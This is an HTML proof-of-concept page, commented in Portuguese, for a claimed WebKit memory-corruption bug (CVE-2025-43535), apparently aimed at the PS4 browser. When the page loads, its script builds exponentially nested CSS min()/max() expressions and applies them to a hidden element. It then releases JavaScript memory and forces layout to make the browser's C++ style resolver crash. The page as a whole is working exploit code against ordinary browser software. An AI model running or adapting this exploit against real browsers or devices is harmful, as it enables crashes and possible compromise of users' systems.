
<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>CVE-2025-43535 PoC — V1 Otimizada</title>
<style>
  body { background:#0a0a0a; color:#88ff88; font-family:monospace; padding:16px; }
  #log { background:#111; border:1px solid #88ff88; padding:12px;
         height:320px; overflow-y:auto; font-size:12px; }
  .ok{color:#00ff88} .fail{color:#ff4444} .info{color:#ffbb00} .crash{color:#ff00ff;font-weight:bold}
</style>
</head>
<body>
<h3>CVE-2025-43535 — Memory Corruption (V1 Max RAM)</h3>
<div id="log"></div>

<script>
"use strict";

const L=(m,c)=>{const d=document.getElementById('log');
  d.innerHTML+=`<div class="${c||'info'}">[${Date.now()%100000}] ${m}</div>`;
  d.scrollTop=d.scrollHeight;
};

// Pausa de 300ms para garantir que o GC destruiu as strings no JS
const yieldGC = () => new Promise(r => setTimeout(r, 300));

async function variant1_css_math_optimized() {
  L("[V1] Iniciando gerador matemático hiper-minificado...");

  const el = document.createElement('div');
  el.style.cssText = 'position:absolute;top:-9999px';
  document.body.appendChild(el);

  let mathCache = {};

  // Função Original, mas gerando a menor string possível em bytes
  function makeMathNested(depth) {
    if (depth <= 0) return '1px'; // 1px economiza bytes valiosos em relação a 10px
    if (mathCache[depth]) return mathCache[depth];

    // Alterna apenas entre min e max. Sem 'clamp' para evitar o 3º argumento que explode a RAM.
    const f = depth % 2 === 0 ? 'min' : 'max';
    
    // Sem espaços, o mais compacto possível
    const result = `${f}(${makeMathNested(depth-1)},${makeMathNested(depth-1)})`;
    
    mathCache[depth] = result;
    return result;
  }

  // Com a otimização de bytes, o PS4 deve passar do 26 com folga.
  const niveisParaTestar = [26, 27, 28];

  for (const d of niveisParaTestar) {
    L(`[V1] Gerando string para nível ${d}...`);
    
    try {
      let payload = makeMathNested(d);
      
      L(`[V1] String gerada. Aplicando no DOM...`);
      el.style.width = payload;

      // ==========================================
      // TRUQUE DE MESTRE: LIBERAÇÃO DE RAM PRÉ-LAYOUT
      // ==========================================
      L(`[V1] Deletando string do JS para liberar RAM pro WebKit C++...`);
      payload = null; 
      
      // Se for o último nível, apaga até o cache para dar 100% da RAM pro C++
      if (d === niveisParaTestar[niveisParaTestar.length - 1]) {
        mathCache = null; 
      }

      // Aguarda o Garbage Collector do JavaScript agir
      await yieldGC(); 

      L(`[V1] Disparando Style Resolver (A hora da verdade)...`);
      await new Promise(r => requestAnimationFrame(r));
      
      // Força o C++ a processar a árvore CSSOM que ficou na memória
      void el.offsetWidth;
      
      L(`[V1] Nível ${d} sobreviveu!`, "ok");
    } catch(e) {
      L(`[V1] Erro no nível ${d}: ${e}`, "fail");
    }

    // Limpeza para o próximo loop
    el.style.width = '10px';
    await yieldGC();
  }

  document.body.removeChild(el);
  L("[V1] Teste da Variante 1 concluído.", "ok");
}

async function main() {
  try {
    await variant1_css_math_optimized();
    L("=== FIM DA EXECUÇÃO ===", "ok");
  } catch(e) {
    L("EXCEÇÃO FATAL: " + e.toString(), "fail");
  }
}

window.addEventListener('load', () => setTimeout(main, 500));
</script>
</body>
</html>
